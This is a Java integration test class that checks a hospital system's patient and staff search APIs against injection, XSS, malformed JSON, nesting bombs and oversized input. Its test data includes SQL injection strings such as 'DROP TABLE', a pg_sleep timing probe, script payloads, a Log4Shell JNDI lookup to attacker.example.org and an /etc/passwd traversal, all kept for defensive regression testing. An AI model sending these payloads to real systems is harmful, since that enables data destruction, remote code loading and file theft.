package com.hms.apitests.security;

import static io.restassured.RestAssured.given;
import static org.assertj.core.api.Assertions.assertThat;

import com.hms.apitests.support.Api;
import com.hms.apitests.support.Fixtures;
import com.hms.apitests.support.RequiresRunningStack;
import java.util.Map;
import org.junit.jupiter.api.BeforeAll;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;

/**
 * Injection and malformed-input abuse cases against the endpoints that take free text.
 *
 * <p>These are not a substitute for sqlmap, which is far better at finding a real injection than a
 * fixed list of payloads. What they add is a regression guard that runs in CI in seconds: if
 * someone replaces a bound parameter with string concatenation, one of these turns red on the next
 * push rather than at the next quarterly scan.
 */
@DisplayName("injection and malformed input")
class InjectionAbuseIT extends RequiresRunningStack {

    private static String mrn;

    @BeforeAll
    static void seed() {
        mrn = Fixtures.registerPatient(Api.RECEPTIONIST, "Inject").mrn();
    }

    @ParameterizedTest(name = "patient search survives: {0}")
    @ValueSource(strings = {
            "' OR '1'='1",
            "'; DROP TABLE patient.patients; --",
            "' UNION SELECT null, null, null --",
            "1' AND (SELECT pg_sleep(5)) --",
            "%' OR mrn LIKE '%",
            "\\",
            "100%",
            "_",
            "<script>alert(1)</script>",
            "${jndi:ldap://attacker.example.org/x}",
            "../../../../etc/passwd",
    })
    void patientSearchIsNotInjectable(String payload) {
        var response = given().spec(Api.as(Api.DOCTOR))
                .queryParam("q", payload)
                .when().get("/patients")
                .then().extract();

        assertThat(response.statusCode())
                .as("payload %s produced %d", payload, response.statusCode())
                .isIn(200, 400);
    }

    @Test
    @DisplayName("a LIKE wildcard in a search term is a literal, not a pattern")
    void wildcardsAreEscaped() {
        long everything = given().spec(Api.as(Api.DOCTOR))
                .queryParam("q", "")
                .when().get("/patients")
                .then().statusCode(200)
                .extract().jsonPath().getLong("totalElements");

        long wildcard = given().spec(Api.as(Api.DOCTOR))
                .queryParam("q", "%")
                .when().get("/patients")
                .then().statusCode(200)
                .extract().jsonPath().getLong("totalElements");

        assertThat(wildcard)
                .as("a bare percent sign must be searched for as a character, not expanded to "
                        + "match every row")
                .isLessThan(everything);

        long underscore = given().spec(Api.as(Api.DOCTOR))
                .queryParam("q", "_")
                .when().get("/patients")
                .then().statusCode(200)
                .extract().jsonPath().getLong("totalElements");

        assertThat(underscore)
                .as("an underscore is a single-character wildcard in LIKE; escaped, it matches "
                        + "only names that really contain one")
                .isLessThan(everything);
    }

    @ParameterizedTest(name = "staff search survives: {0}")
    @ValueSource(strings = {"' OR 1=1 --", "%", "_", "'; SELECT version(); --"})
    void staffSearchIsNotInjectable(String payload) {
        given().spec(Api.as(Api.DOCTOR))
                .queryParam("q", payload)
                .when().get("/staff")
                .then().statusCode(org.hamcrest.Matchers.anyOf(
                        org.hamcrest.Matchers.is(200), org.hamcrest.Matchers.is(400)));
    }

    @Test
    @DisplayName("a malformed JSON body is a 400, not a 500")
    void malformedJsonIsRejectedCleanly() {
        given().spec(Api.as(Api.RECEPTIONIST))
                .body("{\"firstName\": \"unterminated")
                .when().post("/patients")
                .then().statusCode(400);

        given().spec(Api.as(Api.RECEPTIONIST))
                .body("[]")
                .when().post("/patients")
                .then().statusCode(400);
    }

    @Test
    @DisplayName("a deeply nested JSON body is rejected rather than parsed until the stack gives out")
    void deeplyNestedJsonIsRejected() {
        StringBuilder nested = new StringBuilder();
        for (int i = 0; i < 5000; i++) {
            nested.append("{\"a\":");
        }
        nested.append("1");
        nested.append("}".repeat(5000));

        int status = given().spec(Api.as(Api.RECEPTIONIST))
                .body(nested.toString())
                .when().post("/patients")
                .then().extract().statusCode();

        assertThat(status)
                .as("a nesting bomb must be refused, not turned into a StackOverflowError")
                .isIn(400, 413);
    }

    @Test
    @DisplayName("an oversized field is refused by validation, not truncated silently")
    void oversizedFieldsAreRejected() {
        given().spec(Api.as(Api.RECEPTIONIST))
                .body(Map.of(
                        "firstName", "A".repeat(5000),
                        "lastName", "Overflow",
                        "dateOfBirth", "1990-01-01",
                        "sex", "MALE"))
                .when().post("/patients")
                .then().statusCode(400);
    }

    @Test
    @DisplayName("an unexpected content type is refused")
    void wrongContentTypeIsRefused() {
        given().spec(Api.as(Api.RECEPTIONIST))
                .contentType("text/plain")
                .body("firstName=Injected")
                .when().post("/patients")
                .then().statusCode(org.hamcrest.Matchers.anyOf(
                        org.hamcrest.Matchers.is(415), org.hamcrest.Matchers.is(400)));
    }

    @Test
    @DisplayName("stored text comes back as data, not as markup the browser will run")
    void storedTextIsNotInterpreted() {
        String payload = "<img src=x onerror=alert('xss')>";
        var created = given().spec(Api.as(Api.RECEPTIONIST))
                .body(Map.of(
                        "firstName", "Xss",
                        "lastName", "Probe" + Fixtures.RUN,
                        "dateOfBirth", "1990-01-01",
                        "sex", "MALE",
                        "notes", payload,
                        "forceDuplicate", true))
                .when().post("/patients")
                .then().statusCode(201)
                .extract().jsonPath();

        var read = given().spec(Api.as(Api.DOCTOR))
                .when().get("/patients/{id}", created.getString("id"))
                .then().statusCode(200)
                .extract();

        // Round-tripped verbatim - the API's job is to store what it was given. What matters is
        // that it comes back as a JSON string in an application/json response, so no browser will
        // ever parse it as HTML. Escaping at render time is the UI's responsibility and is
        // asserted there, in the Playwright suite.
        assertThat(read.contentType()).contains("application/json");
        assertThat(read.jsonPath().getString("notes")).isEqualTo(payload);
    }

    @Test
    @DisplayName("a search by MRN returns that patient and nobody else")
    void searchReturnsOnlyMatchingRows() {
        var results = given().spec(Api.as(Api.DOCTOR))
                .queryParam("q", mrn)
                .when().get("/patients")
                .then().statusCode(200)
                .extract().jsonPath();

        assertThat(results.getLong("totalElements")).isEqualTo(1L);
        assertThat(results.getString("content[0].mrn")).isEqualTo(mrn);
    }
}
